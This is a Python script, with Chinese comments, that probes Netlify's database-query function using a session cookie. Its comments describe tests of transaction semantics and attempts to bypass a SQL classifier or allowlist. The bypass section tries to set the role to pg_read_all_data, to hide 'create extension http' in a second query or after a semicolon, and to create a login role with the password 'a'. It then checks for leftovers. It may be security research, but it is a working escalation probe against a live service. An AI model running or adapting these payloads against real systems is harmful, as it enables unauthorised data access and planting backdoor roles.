# -*- coding: utf-8 -*-
"""transaction 语义探测:分类器范围 / 事务性 / 连接共享 / 绕过尝试
零残留:所有 DDL 用 k_txn_ 前缀 + 结尾清理;错误后复查
"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

ctx = ssl.create_default_context()


def dbq(body, timeout=45):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    try:
        r = conn.getresponse()
        raw = r.read()
        enc = r.getheader('Content-Encoding')
        if enc == 'br':
            raw = brotli.decompress(raw)
        elif enc == 'gzip':
            raw = gzip.decompress(raw)
        st, out = r.status, raw[:700].decode('utf-8', 'ignore')
    except Exception as e:
        st, out = -1, 'EXC %r' % e
    finally:
        conn.close()
    return st, out


def tx(label, queries, trunc=400):
    body = {'siteId': SITE_A, 'action': 'transaction', 'queries': queries}
    st, out = dbq(body)
    print('%-44s [%d] %s' % (label, st, out.replace('\n', ' | ')[:trunc]))


print('== 语义基线 ==')
tx('multi-elem 顺序执行', [{'sql': 'select 1 as a'}, {'sql': 'select 2 as b'}])
tx('set role + current_user', [{'sql': 'set role pg_read_all_data'}, {'sql': 'select current_user::text'}])
print()
print('== 事务回滚验证 ==')
tx('create table + 除零错误', [{'sql': 'create table k_txn_t1(x int)'},
                               {'sql': 'insert into k_txn_t1 values (1)'},
                               {'sql': 'select 1/0'}])
st, out = dbq({'siteId': SITE_A, 'action': 'query',
               'sql': "select to_regclass('public.k_txn_t1')::text"})
print('残留检查 k_txn_t1      [%d] %s' % (st, out[:200]))
print()
print('== 分类器/allowlist 绕过尝试 ==')
tx('单元素 create ext http', [{'sql': 'create extension if not exists http'}])
tx('第二元素 create ext http', [{'sql': 'select 1'}, {'sql': 'create extension if not exists http'}])
tx('单元素内多语句 create ext http', [{'sql': 'select 1; create extension if not exists http'}])
tx('单元素内多语句 create role 弱密码', [{'sql': "create role k_txn_w with login password 'a'"}])
print('== 残留清理复查 ==')
st, out = dbq({'siteId': SITE_A, 'action': 'query',
               'sql': "select count(*) as c from pg_roles where rolname in ('k_txn_w')"})
print('k_txn_w 存在?           [%d] %s' % (st, out[:200]))
st, out = dbq({'siteId': SITE_A, 'action': 'query',
               'sql': "select count(*) as c from pg_extension where extname='http'"})
print('http 扩展存在?          [%d] %s' % (st, out[:200]))
